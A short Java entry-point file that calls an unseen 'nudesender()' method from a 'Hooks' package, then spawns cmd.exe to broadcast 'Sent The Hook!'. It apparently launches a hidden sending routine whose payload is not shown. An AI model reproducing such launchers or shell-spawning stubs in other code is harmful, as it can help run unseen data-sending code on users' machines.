import Hooks.Default;


public class Main {

    public static void main(String[] args) {
        Default adefault = new Default();

        try {
            adefault.nudesender();
            Thread.sleep(1000);

            Runtime.getRuntime().exec("cmd /c start cmd.exe /K \"msg * Sent The Hook! && exit\"");
            System.exit(0);
        } catch (Exception e)
        {
            e.printStackTrace();
        }



    }

}
